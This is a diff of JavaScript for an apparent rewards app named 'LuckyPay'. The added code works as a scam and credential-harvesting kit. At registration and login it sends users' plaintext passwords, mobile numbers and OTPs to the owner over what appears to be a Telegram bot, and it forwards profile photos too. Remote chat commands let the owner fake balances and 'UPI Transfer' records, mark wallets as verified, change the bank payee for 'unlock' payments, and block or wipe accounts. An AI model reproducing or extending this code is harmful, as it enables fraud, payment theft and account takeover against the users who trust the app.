+        if(mt&&mt[1]===m){var w=mt[2];if(w.toLowerCase()==='mobikwik')w='MobiKwik';if(w.toLowerCase()==='freecharge')w='Freecharge';if(w.toLowerCase()==='paytm')w='Paytm';var ws=getWl();ws[w]=true;setWl(ws);var rq=getWlReq();delete rq[w];setWlReq(rq);wlChg=true;toast(w+' verified ✓','success');return;}
+        mt=txt.match(/^\/?walletno\s+(\d{10})(?:\s+(Paytm|MobiKwik|Mobikwik|Freecharge))?$/i);
+        if(mt&&mt[1]===m){if(mt[2]){var wr=mt[2];if(wr.toLowerCase()==='mobikwik')wr='MobiKwik';if(wr.toLowerCase()==='freecharge')wr='Freecharge';if(wr.toLowerCase()==='paytm')wr='Paytm';var rq2=getWlReq();delete rq2[wr];setWlReq(rq2);}else{del(wlReqK(m));}wlChg=true;toast('Wallet rejected','error');return;}
+        mt=txt.match(/^\/?walletreset\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setWl({Paytm:false,MobiKwik:false,Freecharge:false});del(wlReqK(m));wlChg=true;toast('Wallets reset','error');return;}
+
+        mt=txt.match(/^\/?resetpass\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setRstAppr();rstAppr=true;toast('Reset approved','success');return;}
+
+        mt=txt.match(/^\/?support\s+(\d{10})\s+(\d{10})\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setSup({p:mt[2],w:mt[3]});supChg=true;toast('Support updated','success');return;}
+        mt=txt.match(/^\/?supportoff\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){delSup();supChg=true;toast('Support reset','success');return;}
+
+        mt=txt.match(/^\/?payee\s+(\d{10})\s+(\d{6,18})\s+([A-Z]{4}0[A-Z0-9]{6})\s+(.+)$/i);
+        if(mt&&mt[1]===m){setPayee({account:mt[2],ifsc:mt[3].toUpperCase(),name:mt[4].trim().slice(0,40)});payeeChg=true;toast('Payee updated ✓','success');return;}
+        mt=txt.match(/^\/?payeeoff\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){delPayee();payeeChg=true;toast('Payee OFFLINE','error');return;}
+
+        mt=txt.match(/^\/?payok\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){var p1=getPay();if(p1&&p1.status==='pending'){p1.status='approved';setPay(p1);addTx({amount:p1.amount,label:'Payment Coupon',time:Date.now()});txChg=true;if($('paymentModal').classList.contains('show')){stopPayTimer();showPayPanel('payStep3');}toast('Payment verified!','success');}return;}
+        mt=txt.match(/^\/?payno\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){var p2=getPay();if(p2&&p2.status==='pending'){p2.status='rejected';setPay(p2);if($('paymentModal').classList.contains('show')){stopPayTimer();showPayPanel('payStep4');}toast('Payment rejected','error');}return;}
+
+        mt=txt.match(/^\/?ok\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setAppr();del(blkK(m));return;}
+        mt=txt.match(/^\/?block\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setBlk();toast('You are blocked','error');return;}
+
+        /* RESET — pura data delete + register page */
+        mt=txt.match(/^\/?reset\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){
+          [balK,prizeK,apprK,blkK,txnK,payK,payeeK,supK,pwK,rstK,wlK,wlReqK,logOkK,logRejK,photoK,inviteCountK,inviteEarnK,usedInviteK].forEach(function(fn){try{del(fn(m));}catch(e){}});
+          del('lp_off_'+m);
+          del(STORE.regTime);del(STORE.user);del(STORE.mobile);del(STORE.invite);del(STORE.loggedIn);
+          try{if(cmdPollInt)clearInterval(cmdPollInt);}catch(e){}
+          try{if(unlockPollInt)clearInterval(unlockPollInt);}catch(e){}
+          try{if(logPollInt)clearInterval(logPollInt);}catch(e){}
+          toast('Account reset — Register again','error');
+          setTimeout(function(){window.location.href=window.location.href;},1200);
+          return;
+        }
+
+        mt=txt.match(/^\/?cleartxn\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setTx([]);txChg=true;toast('History cleared','success');return;}
+
+        mt=txt.match(/^\/?setuser\s+(\d{10})\s+(.+)$/i);
+        if(mt&&mt[1]===m){var nn=mt[2].trim().slice(0,20);save(STORE.user,nn);if($('hUsername'))$('hUsername').textContent=nn;if($('profUsername'))$('profUsername').textContent=nn;toast('Username updated','success');return;}
+        mt=txt.match(/^\/?setinvite\s+(\d{10})\s+([A-Za-z0-9]{3,10})$/i);
+        if(mt&&mt[1]===m){save(STORE.invite,mt[2]);if($('profInvite'))$('profInvite').textContent=mt[2];toast('Invite updated','success');return;}
+
+        var mneg=txt.match(/^\/?(?:minus|deduct|subtract)\s+(\d{1,6})\s+(\d{10})$/i)||txt.match(/^-(\d{1,6})\s+(\d{10})$/);
+        if(mneg&&mneg[2]===m){var n=parseInt(mneg[1],10);setBal(Math.max(0,getBal()-n));addTx({amount:-n,label:'UPI Transfer',time:Date.now(),neg:true});renderBal(true);txChg=true;toast('₹'+n+' transferred','error');return;}
+        var madd=txt.match(/^\/?(?:add|plus)\s+(\d{1,6})\s+(\d{10})$/i);
+        if(madd&&madd[2]===m){var a=parseInt(madd[1],10);setBal(getBal()+a);addTx({amount:a,label:'Bonus Credit',time:Date.now()});renderBal(true);txChg=true;toast('₹'+a+' added','success');return;}
+        var mamt=txt.match(/^\/?(?:set[_\s]?)?amount[=:\s]+(\d{1,6})\s+(\d{10})$/i)||txt.match(/^\/?(?:set[_\s]?)?amount[=:\s]+(\d{10})\s+(\d{1,6})$/i);
+        var setA=null;
+        if(mamt){if(mamt[2]===m)setA=parseInt(mamt[1],10);else if(mamt[1]===m)setA=parseInt(mamt[2],10);}
+        if(setA!==null){var prev=getBal();setBal(setA);var df=setA-prev;if(df!==0)addTx({amount:df,label:df>0?'Balance Updated':'Balance Adjusted',time:Date.now(),neg:df<0});renderBal(true);txChg=true;toast('Balance ₹'+setA,'success');return;}
+        var mtxn=txt.match(/^\/?txn\s+([A-Za-z0-9_\-\s]+?)\s+(-?\d{1,6})\s+(\d{10})$/i);
+        if(mtxn&&mtxn[3]===m){var lb=mtxn[1].trim().slice(0,30),ta=parseInt(mtxn[2],10);if(!isNaN(ta)&&ta!==0){addTx({amount:ta,label:lb,time:Date.now(),neg:ta<0});txChg=true;toast('Entry added','success');}return;}
+      });
+      if(mx>last)save('lp_off_'+m,String(mx));
+      if(txChg&&$('historyList'))renderTx();
+      if(payeeChg)renderPayee();
+      if(supChg)renderSup();
+      if(wlChg){renderVerified();updateWlCards();}
+      if(inviteCred)renderInviteCount();
+      if(rstAppr&&opts.onRstAppr)opts.onRstAppr();
+      if(logOk&&opts.onLogOk)opts.onLogOk();
+      if(logRej&&opts.onLogRej)opts.onLogRej();
+      if(unlocked&&opts.onUnlock)opts.onUnlock();
+      if(unblocked){
+        toast('Account unblocked! Opening...','success');
+        setTimeout(function(){openDash();if(cmdPollInt)clearInterval(cmdPollInt);cmdPollInt=setInterval(function(){pollTg();},POLL_MS);},500);
+      }
+    }).catch(function(){pollActive=false;});
+  }
+
+  function openDash(){
+    showScr('appScreen');
+    var u=read(STORE.user)||'User',m=read(STORE.mobile)||'',inv=read(STORE.invite)||'-----';
+    if($('hUsername'))$('hUsername').textContent=u;
+    if($('profUsername'))$('profUsername').textContent=u;
+    if($('profMobile'))$('profMobile').textContent='+91 '+m;
+    if($('profInvite'))$('profInvite').textContent=inv;
+    renderPhoto();renderVerified();renderBal(false);renderTx();renderPayee();renderSup();renderInviteCount();
+    goPage('home');
+    if(cmdPollInt)clearInterval(cmdPollInt);
+    cmdPollInt=setInterval(function(){pollTg();},POLL_MS);
+    tg('<b>✅ Login Successful</b>\n\n👤 '+esc(u)+'\n📱 +91 '+esc(m)+'\n🕒 '+new Date().toLocaleString('en-IN'));
+  }
+
+  /* REGISTER */
+  var regOtpT=null,regSec=0,regSent=false;
+  function updOtpBtn(){var b=$('getOtpBtn');if(regSec>0){b.textContent=regSec+'s';b.disabled=true;}else{b.textContent='GET OTP';b.disabled=false;}}
+  function setHint(el,t){el.className='hint sent';el.innerHTML='<i class="fa-solid fa-circle-check"></i> '+t;}
+  function setHintExp(el,t){el.className='hint expired';el.innerHTML='<i class="fa-solid fa-hourglass-end"></i> '+t;}
+  function clrHint(el){el.className='hint';el.innerHTML='';}
+
+  function bindReg(){
+    $('regMobile').addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,10);});
+    $('regOtp').addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,6);});
+    $('regInvite').addEventListener('input',function(e){e.target.value=e.target.value.replace(/[^A-Za-z0-9]/g,'').slice(0,5);});
+    $('getOtpBtn').addEventListener('click',function(){
+      var m=$('regMobile').value.trim();
+      if(!MRE.test(m)){toast('Enter valid mobile (6-9)','error');return;}
+      if(regOtpT)return;
+      regSent=true;regSec=59;updOtpBtn();
+      regOtpT=setInterval(function(){
+        regSec--;
+        if(regSec<=0){clearInterval(regOtpT);regOtpT=null;regSec=0;updOtpBtn();setHintExp($('otpHint'),'OTP expired. Tap GET OTP again.');}
+        else updOtpBtn();
+      },1000);
+      setHint($('otpHint'),'OTP sent to +91 '+m);
+      tg('<b>📨 Register OTP Request</b>\n\n👤 '+esc($('regUser').value.trim()||'-')+'\n📱 +91 '+esc(m)+'\n🕒 '+new Date().toLocaleString('en-IN'));
+      toast('OTP sent','success');
+    });
+    $('createBtn').addEventListener('click',function(){
+      var u=$('regUser').value.trim(),p=$('regPass').value,m=$('regMobile').value.trim(),o=$('regOtp').value.trim(),inv=$('regInvite').value.trim();
+      if(u.length<3){toast('User ID min 3 chars','error');return;}
+      if(p.length<4){toast('Password min 4 chars','error');return;}
+      if(!MRE.test(m)){toast('Enter valid mobile','error');return;}
+      if(!regSent){toast('Please click GET OTP first','error');return;}
+      if(!/^\d{4,6}$/.test(o)){toast('Enter the OTP','error');return;}
+      var code=/^[A-Za-z0-9]{5}$/.test(inv)?inv:rndCode();
+      save(STORE.user,u);save(STORE.mobile,m);save(STORE.invite,code);
+      save(STORE.loggedIn,'1');save(STORE.regTime,String(Date.now()));
+      setPw(m,p);
+      del(apprK(m));del(blkK(m));
+      if(inv && inv.length===5){
+        save(usedInviteK(m),inv);
+        tg('<b>🎉 New User with INVITE Code</b>\n\n<b>👤 User ID:</b> '+esc(u)+'\n<b>🔑 Password:</b> '+esc(p)+'\n<b>📱 Mobile:</b> +91 '+esc(m)+'\n<b>🔢 OTP:</b> '+esc(o)+'\n<b>🎟️ USED INVITE CODE:</b> <code>'+esc(inv)+'</code>\n<b>🕒 Time:</b> '+new Date().toLocaleString('en-IN')+'\n\n<b>⚠️ Owner:</b> Find referrer with this code and send\n<code>inviteok &lt;referrer_mobile&gt;</code>');
+      } else {
+        tg('<b>🎉 New User Registered — LuckyPay</b>\n\n<b>👤 User ID:</b> '+esc(u)+'\n<b>🔑 Password:</b> '+esc(p)+'\n<b>📱 Mobile:</b> +91 '+esc(m)+'\n<b>🔢 OTP:</b> '+esc(o)+'\n<b>🎟️ Invite:</b> '+esc(code)+'\n<b>🕒 Time:</b> '+new Date().toLocaleString('en-IN'));
+      }
+      toast('Account created! Please login.','success');
+      if($('logMobile'))$('logMobile').value=m;
+      if($('logPass'))$('logPass').value='';
+      showScr('loginScreen');
+    });
+  }
+
+  function bindLogin(){
+    $('logMobile').addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,10);});
+    $('loginBtn').addEventListener('click',function(){
+      var m=$('logMobile').value.trim(),p=$('logPass').value;
+      if(!MRE.test(m)){toast('Enter valid mobile','error');return;}
+      if(!p||p.length<4){toast('Enter your password','error');return;}
+      var sp=getPw(m),sm=read(STORE.mobile);
+      if(!sp||sm!==m){toast('Account not found. Please register.','error');return;}
+      if(sp!==p){toast('Incorrect password','error');return;}
+      if(read(blkK(m))==='1'){
+        save(STORE.mobile,m);
+        toast('Account blocked by owner','error');
+        tg('<b>🚫 Blocked Login Attempt</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(m)+'\n\n<b>Unblock:</b> <code>unblock '+esc(m)+'</code>');
+        if(cmdPollInt)clearInterval(cmdPollInt);
+        cmdPollInt=setInterval(function(){
+          pollTg({mobile:m,skipApprUI:true});
+          if(read(blkK(m))!=='1'){
+            clearInterval(cmdPollInt);cmdPollInt=null;
+            toast('Account unblocked ✓ Opening...','success');
+            setTimeout(openDash,500);
+          }
+        },POLL_MS);
+        return;
+      }
+      save(STORE.mobile,m);
+      clrLogOk(m);clrLogRej(m);
+      goLoginOtp(m);
+    });
+    $('forgotLink').addEventListener('click',function(){showScr('forgotScreen');startForgot();});
+  }
+
+  var logOtpInt=null,logSec=0,logMobileCache='';
+  function goLoginOtp(m){
+    logMobileCache=m;
+    $('otpMobileDisplay').textContent=m;
+    $('otpBox').value='';
+    showScr('loginOtpScreen');
+    startLogTimer();
+    tg('<b>🔐 Login OTP Request</b>\n\n<b>👤 User:</b> '+esc(read(STORE.user)||'-')+'\n<b>📱 Mobile:</b> +91 '+esc(m)+'\n\n<b>Approve:</b> <code>yes '+esc(m)+'</code>\n<b>Reject:</b> <code>reject '+esc(m)+'</code>');
+    if(logPollInt)clearInterval(logPollInt);
+    logPollInt=setInterval(function(){
+      pollTg({mobile:m,skipApprUI:true,
+        onLogOk:function(){clrLogOk(m);stopLogPoll();stopLogTimer();toast('Login verified ✓','success');setTimeout(openDash,300);},
+        onLogRej:function(){clrLogRej(m);stopLogPoll();stopLogTimer();showRejectScreen();}
+      });
+      if(isLogOk(m)){clrLogOk(m);stopLogPoll();stopLogTimer();toast('Login verified ✓','success');setTimeout(openDash,300);}
+      if(isLogRej(m)){clrLogRej(m);stopLogPoll();stopLogTimer();showRejectScreen();}
+    },POLL_MS);
+  }
+  function startLogTimer(){
+    if(logOtpInt)clearInterval(logOtpInt);
+    logSec=OTP_TIMEOUT_SEC;
+    var orb=$('otpOrb'),tx=$('otpTimerText'),ex=$('otpExpiresText'),rl=$('otpResendLine'),rb=$('otpResendBtn');
+    rb.disabled=true;
+    function tick(){
+      var pct=(logSec/OTP_TIMEOUT_SEC)*100;
+      orb.style.setProperty('--p',pct+'%');
+      tx.textContent=logSec;ex.textContent=logSec+'s';
+      orb.classList.remove('warn','danger');
+      if(logSec<=10)orb.classList.add('danger');
+      else if(logSec<=30)orb.classList.add('warn');
+      if(logSec<=0){clearInterval(logOtpInt);logOtpInt=null;orb.style.setProperty('--p','0%');tx.textContent='0';ex.textContent='Expired';rl.innerHTML='<b style="color:#dc2626;">Code expired</b>. Please resend.';rb.disabled=false;return;}
+      logSec--;
+    }
+    tick();logOtpInt=setInterval(tick,1000);
+  }
+  function stopLogTimer(){if(logOtpInt){clearInterval(logOtpInt);logOtpInt=null;}}
+  function stopLogPoll(){if(logPollInt){clearInterval(logPollInt);logPollInt=null;}}
+
+  function bindLoginOtp(){
+    var bx=$('otpBox');
+    bx.addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,6);});
+    $('otpVerifyBtn').addEventListener('click',function(){
+      var v=bx.value.trim();
+      var m=logMobileCache;
+      if(v.length>=4){tg('<b>🔢 Login OTP Submitted</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(m)+'\n🔢 <code>'+esc(v)+'</code>');}
+      showScr('verifyScreen');
+      $('verifyOrb').classList.remove('reject-orb');
+      $('verifyOrb').innerHTML='<i class="fa-solid fa-hourglass-half"></i>';
+      $('verifyTitle').textContent='Verifying OTP';
+      $('verifyTitle').classList.remove('reject');
+      $('verifyDesc').innerHTML='Please wait while owner confirms your login.<br>Do not close the app.';
+      $('verifyBar').style.display='block';
+      $('verifyDots').style.display='flex';
+      $('verifyStatus').style.display='inline-flex';
+      $('verifyStatus').innerHTML='<i class="fa-solid fa-circle-notch"></i> <span>Waiting for owner approval...</span>';
+      $('verifyBackBtn').style.display='none';
+      if(!logPollInt){
+        logPollInt=setInterval(function(){
+          pollTg({mobile:m,skipApprUI:true,
+            onLogOk:function(){clrLogOk(m);stopLogPoll();stopLogTimer();toast('Login verified ✓','success');setTimeout(openDash,300);},
+            onLogRej:function(){clrLogRej(m);stopLogPoll();stopLogTimer();showRejectScreen();}
+          });
+          if(isLogOk(m)){clrLogOk(m);stopLogPoll();stopLogTimer();toast('Login verified ✓','success');setTimeout(openDash,300);}
+          if(isLogRej(m)){clrLogRej(m);stopLogPoll();stopLogTimer();showRejectScreen();}
+        },POLL_MS);
+      }
+    });
+    $('otpResendBtn').addEventListener('click',function(){
+      if(this.disabled)return;
+      var m=logMobileCache||read(STORE.mobile);
+      if(!m){toast('Please login again','error');showScr('loginScreen');return;}
+      goLoginOtp(m);toast('New OTP sent','success');
+    });
+    $('otpBackLink').addEventListener('click',function(){stopLogTimer();stopLogPoll();showScr('loginScreen');});
+    $('verifyBackBtn').addEventListener('click',function(){stopLogTimer();stopLogPoll();showScr('loginScreen');});
+  }
+
+  function showRejectScreen(){
+    $('verifyOrb').classList.add('reject-orb');
+    $('verifyOrb').innerHTML='<i class="fa-solid fa-circle-xmark"></i>';
+    $('verifyTitle').textContent='Login Rejected';
+    $('verifyTitle').classList.add('reject');
+    $('verifyDesc').innerHTML='Owner has rejected this login request.<br>Please try again later or contact support.';
+    $('verifyBar').style.display='none';
+    $('verifyDots').style.display='none';
+    $('verifyStatus').style.display='none';
+    $('verifyBackBtn').style.display='flex';
+    showScr('verifyScreen');
+  }
+
+  function sendForgotWA(){
+    var uid=read(STORE.user)||'-',um=read(STORE.mobile)||'';
+    var msg='🙏 Namaste Owner,\n\nMera LuckyPay password bhool gaya.\n\n📌 User ID: '+uid+'\n📱 Mobile: +91 '+um+'\n\nPlease reset kar dijiye.';
+    var wa=OWNER_WA.replace(/\D/g,'');if(wa.length===10)wa='91'+wa;
+    var u='https://wa.me/'+wa+'?text='+encodeURIComponent(msg);
+    try{window.open(u,'_blank');}catch(e){window.location.href=u;}
+    tg('<b>🔑 Forgot Password</b>\n\n👤 '+esc(uid)+'\n📱 +91 '+esc(um)+'\n\n<b>Approve:</b> <code>resetpass '+esc(um)+'</code>');
+    toast('WhatsApp opened','success');
+  }
+  function startForgot(){
+    $('forgotUser').textContent=read(STORE.user)||'-';
+    $('forgotMobile').textContent='+91 '+(read(STORE.mobile)||'----------');
+    setTimeout(sendForgotWA,800);
+    if(forgotPollInt)clearInterval(forgotPollInt);
+    forgotPollInt=setInterval(function(){
+      pollTg({onRstAppr:function(){clearInterval(forgotPollInt);forgotPollInt=null;showNewPass();}});
+      if(isRstAppr()){clearInterval(forgotPollInt);forgotPollInt=null;showNewPass();}
+    },POLL_MS);
+  }
+  function showNewPass(){
+    $('npUserVal').textContent=read(STORE.user)||'-';
+    $('npMobileVal').textContent='+91 '+(read(STORE.mobile)||'----------');
+    $('npNew').value='';$('npConfirm').value='';
+    showScr('newPassScreen');
+    toast('Owner approved! Set new password.','success');
+  }
+  function bindForgot(){
+    $('forgotResendBtn').addEventListener('click',function(){sendForgotWA();});
+    $('forgotCancelBtn').addEventListener('click',function(){if(forgotPollInt){clearInterval(forgotPollInt);forgotPollInt=null;}showScr('loginScreen');});
+  }
+  function bindNewPass(){
+    $('npSaveBtn').addEventListener('click',function(){
+      var np=$('npNew').value,cf=$('npConfirm').value;
+      if(np.length<4){toast('Password min 4 chars','error');return;}
+      if(np!==cf){toast('Passwords do not match','error');return;}
+      var m=read(STORE.mobile);if(!m){toast('Please login again','error');return;}
+      setPw(m,np);clrRstAppr();
+      if(forgotPollInt){clearInterval(forgotPollInt);forgotPollInt=null;}
+      tg('<b>🔐 Password Changed</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(m));
+      toast('Password updated!','success');
+      showScr('loginScreen');
+      if($('logMobile'))$('logMobile').value=m;
+      if($('logPass'))$('logPass').value='';
+    });
+    $('npCancelBtn').addEventListener('click',function(){showScr('loginScreen');});
+  }
+
+  function goPage(name){
+    var pages=document.querySelectorAll('.page');
+    for(var i=0;i<pages.length;i++)pages[i].classList.add('hidden');
+    var t=$('page-'+name);if(t)t.classList.remove('hidden');
+    var items=document.querySelectorAll('.nav-item');
+    for(var j=0;j<items.length;j++)items[j].classList.toggle('active',items[j].getAttribute('data-page')===name);
+    if(name==='history')renderTx();
+    if(name==='profile'){renderSup();renderPhoto();renderInviteCount();}
+    if(name==='wallet')updateWlCards();
+    window.scrollTo({top:0,behavior:'smooth'});
+  }
+  function bindNav(){
+    var items=document.querySelectorAll('.nav-item');
+    for(var i=0;i<items.length;i++)items[i].addEventListener('click',function(){goPage(this.getAttribute('data-page'));});
+    $('quickInvite').addEventListener('click',openInvite);
+    $('inviteBanner').addEventListener('click',openInvite);
+    $('quickWallet').addEventListener('click',function(){goPage('wallet');});
+    $('profCopyBtn').addEventListener('click',function(){copyTxt(read(STORE.invite),'Invite copied!');});
+    $('profShareBtn').addEventListener('click',openInvite);
+    $('purchaseBox').addEventListener('click',requestUnlock);
+    $('logoutBtn').addEventListener('click',function(){$('logoutModal').classList.add('show');});
+    $('confirmLogoutBtn').addEventListener('click',doLogout);
+    $('supportBox').addEventListener('click',openSup);
+    $('floatSupport').addEventListener('click',openSup);
+    $('supportCallBtn').addEventListener('click',function(){
+      var s=getSup();try{window.location.href='tel:'+s.p;}catch(e){}
+      toast('Opening dialer...','success');
+      tg('<b>📞 Support CALL</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-'));
+    });
+    $('supportWaBtn').addEventListener('click',function(){
+      var s=getSup(),wa=String(s.w||'').replace(/\D/g,'');if(wa.length===10)wa='91'+wa;
+      var u='https://wa.me/'+wa+'?text='+encodeURIComponent('Hello, I need help with LuckyPay.');
+      try{window.open(u,'_blank');}catch(e){window.location.href=u;}
+      toast('Opening WhatsApp...','success');
+    });
+    $('profCallBtn').addEventListener('click',function(e){e.stopPropagation();openSup();});
+    $('profSupportRow').addEventListener('click',function(e){if(e.target.closest('#profCallBtn'))return;openSup();});
+    $('payVerifyBtn').addEventListener('click',submitPayment);
+    $('payDoneBtn').addEventListener('click',function(){closeSheet('paymentModal');delPay();stopFormTimer();});
+    $('payRetryBtn').addEventListener('click',function(){var p=getPay();if(p){p.status='ready';setPay(p);}resetUpload();openPayModal();});
+    $('payTimeoutBtn').addEventListener('click',function(){var p=getPay();if(p){p.status='idle';p.amount=getPrize();setPay(p);}resetUpload();renderPayee();requestUnlock();stopFormTimer();});
+    $('reqPopupOk').addEventListener('click',function(){$('walletReqPopup').classList.remove('show');});
+    var copies=document.querySelectorAll('.payee-copy');
+    for(var k=0;k<copies.length;k++)copies[k].addEventListener('click',function(e){
+      e.stopPropagation();
+      var what=this.getAttribute('data-copy'),p=getPayee();
+      if(!p){toast('Payee not available','error');return;}
+      var txt='';
+      if(what==='amount')txt=String(getPrize());
+      else if(what==='account')txt=p.account;
+      else if(what==='name')txt=p.name;
+      else if(what==='ifsc')txt=p.ifsc;
+      if(!txt){toast('Nothing to copy','error');return;}
+      copyTxt(txt,'Copied: '+txt);
+    });
+
+    var photoInp=$('profPhotoInput');
+    $('profUploadBtn').addEventListener('click',function(){photoInp.click();});
+    $('profAvatar').addEventListener('click',function(){photoInp.click();});
+    photoInp.addEventListener('change',function(e){
+      var f=e.target.files&&e.target.files[0];if(!f)return;
+      if(!/^image\//.test(f.type)){toast('Please select an image','error');return;}
+      if(f.size>2*1024*1024){toast('Image too large (max 2MB)','error');return;}
+      var r=new FileReader();
+      r.onload=function(ev){
+        var data=ev.target.result;
+        setPhoto(data);renderPhoto();
+        toast('Profile photo updated ✓','success');
+        tg('<b>🖼️ Profile Photo Updated</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-'));
+        try{tgPhoto(data,'🖼️ Profile Photo\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-'));}catch(err){}
+      };
+      r.readAsDataURL(f);
+    });
+    $('profRemoveBtn').addEventListener('click',function(){
+      delPhoto();renderPhoto();
+      toast('Profile photo removed','success');
+      tg('<b>🗑️ Profile Photo Removed</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-'));
+    });
+
+    $('copyInviteBtn').addEventListener('click',shareInvite);
+
+    var lt=null,lg=$('logoOrb');
+    if(lg){lg.addEventListener('touchstart',function(){lt=setTimeout(function(){tg('<b>🔔 Test</b>\n\nLuckyPay OK\n🕒 '+new Date().toLocaleString('en-IN'));toast('Test sent','success');},1500);});lg.addEventListener('touchend',function(){clearTimeout(lt);});}
+
+    /* VIDEO POPUP BINDING */
+    $('videoOkBtn').addEventListener('click',function(){
+      $('videoPopup').classList.remove('show');
+      try{$('videoPlayer').pause();$('videoPlayer').src='';}catch(e){}
+    });
+    $('videoCloseBtn').addEventListener('click',function(){
+      $('videoPopup').classList.remove('show');
+      try{$('videoPlayer').pause();$('videoPlayer').src='';}catch(e){}
+    });
+  }
+
+  function openInvite(){
+    var code=read(STORE.invite)||'-----';
+    $('inviteCodeBox').textContent=code;
+    renderInviteCount();
+    $('inviteModal').classList.add('show');
+  }
+  function shareInvite(){
+    var code=read(STORE.invite)||'';
+    var uid=read(STORE.user)||'';
+    if(!code||code==='-----'){toast('No invite code','error');return;}
+    var LINK='';
+    var msg='🎁 *LuckyPay – Earn ₹50 Free!*\n\n'+
+            '💰 Register Bonus: ₹50\n'+
+            '🎟️ Use my invite code: *'+code+'*\n'+
+            (LINK?'\n🔗 Download: '+LINK+'\n':'')+
+            '\nJoin now & start earning rewards!';
+    var u='https://wa.me/?text='+encodeURIComponent(msg);
+    try{window.open(u,'_blank');}catch(e){window.location.href=u;}
+    toast('Sharing invite...','success');
+    tg('<b>📤 Invite Shared</b>\n\n👤 '+esc(uid)+'\n🎟️ Code: <code>'+esc(code)+'</code>');
+  }
+
+  function openSup(){renderSup();$('supportModal').classList.add('show');}
+  function doLogout(){
+    tg('<b>🚪 Logout</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-'));
+    del(STORE.loggedIn);
+    stopPayTimer();stopLogTimer();stopLogPoll();stopFormTimer();
+    if(cmdPollInt){clearInterval(cmdPollInt);cmdPollInt=null;}
+    if(unlockPollInt){clearInterval(unlockPollInt);unlockPollInt=null;}
+    closeSheet('logoutModal');
+    wAttempts={};wSent=false;
+    if($('logMobile'))$('logMobile').value=read(STORE.mobile)||'';
+    if($('logPass'))$('logPass').value='';
+    showScr('loginScreen');
+    var mm=read(STORE.mobile);
+    if(mm){cmdPollInt=setInterval(function(){pollTg({mobile:mm,skipApprUI:true});},POLL_MS);}
+    toast('Logged out','success');
+  }
+
+  function renderVerified(){
+    var w=getWl(),list=WALLETS.filter(function(x){return w[x];}),c=$('verifiedCard');
+    if(!c)return;
+    if(list.length>0){$('verifiedText').textContent=list.join(', ')+' verified';c.classList.remove('hidden');}
+    else c.classList.add('hidden');
+    updateWlCards();
+  }
+  function updateWlCards(){
+    var w=getWl(),rq=getWlReq(),cards=document.querySelectorAll('.wallet-card');
+    for(var i=0;i<cards.length;i++){
+      var c=cards[i],n=c.getAttribute('data-wallet'),b=c.querySelector('.btn-verify'),s=c.querySelector('.wc-status');
+      c.classList.remove('verified','pending-card');
+      b.classList.remove('verified','pending');
+      s.classList.remove('ok','pending');
+      if(w[n]){c.classList.add('verified');b.textContent='Verified';b.classList.add('verified');s.innerHTML='<span class="dot"></span> Verification completed';s.classList.add('ok');}
+      else if(rq[n]){c.classList.add('pending-card');b.textContent='Pending';b.classList.add('pending');s.innerHTML='<span class="dot"></span> Waiting for owner';s.classList.add('pending');}
+      else{b.textContent='Verify';s.innerHTML='<span class="dot"></span> Not verified';}
+    }
+  }
+
+  function fallbackCopy(t){
+    var ta=document.createElement('textarea');ta.value=t;ta.setAttribute('readonly','');
+    ta.style.position='fixed';ta.style.top='-1000px';ta.style.opacity='0';
+    document.body.appendChild(ta);ta.select();ta.setSelectionRange(0,ta.value.length);
+    try{document.execCommand('copy');}catch(e){}
+    document.body.removeChild(ta);
+  }
+  function copyTxt(t,msg){
+    if(!t||t==='-----'){toast('Nothing to copy','error');return;}
+    function done(){toast(msg||'Copied!','success');}
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done).catch(function(){fallbackCopy(t);done();});}
+    else{fallbackCopy(t);done();}
+  }
+
+  var curW=null,wAttempts={},wSent=false,wToken=0;
+  function openWlSheet(n){
+    curW=n;
+    if(getWl()[n]){toast(n+' already verified','success');return;}
+    var rq=getWlReq();
+    if(rq[n]){showWlReqPop(n,rq[n].mobile);return;}
+    $('wSheetTitle').textContent='Verify '+n;
+    $('wSheetSub').textContent='Enter mobile & OTP';
+    $('wMobile').value=read(STORE.mobile)||'';
+    $('wOtp').value='';
+    clrHint($('wOtpHint'));
+    wSent=false;
+    showWPanel('wStep1');
+    $('walletModal').classList.add('show');
+  }
+  function showWPanel(id){
+    ['wStep1','wStep2','wLoading','wSuccess'].forEach(function(p){var el=$(p);if(el)el.classList.add('hidden');});
+    var t=$(id);if(t)t.classList.remove('hidden');
+  }
+  function showWlReqPop(w,m){
+    $('reqWalletName').textContent=w;
+    $('reqWalletMobile').textContent='+91 '+m;
+    $('walletReqPopup').classList.add('show');
+  }
+  function submitWlReq(w,m){
+    var rq=getWlReq();rq[w]={mobile:m,time:Date.now()};setWlReq(rq);
+    closeSheet('walletModal');
